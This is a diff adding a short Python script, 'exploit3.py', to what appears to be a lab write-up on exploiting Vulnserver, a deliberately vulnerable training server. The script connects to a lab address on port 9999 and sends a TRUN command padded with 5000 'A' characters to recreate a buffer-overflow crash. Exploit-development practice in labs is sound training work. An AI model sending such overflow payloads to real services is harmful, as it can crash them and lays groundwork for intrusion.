@@ -26,4 +26,22 @@ Open the Vulnserver.exe in Immunity Debugger.
 To Recreate the Crash we write a Python Script : `exploit3.py`
 
 ```python
+#!/usr/bin/python
+import os 
+import sys 
+import socket
+
+
+host = "192.168.242.130"
+port = 9999
+buffer = "A" * 5000
+s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+print ("sending exploit3")
+s.send("TRUN /.:/" + buffer)
+print s.recv(1024)
+s.close()
+```
+
 
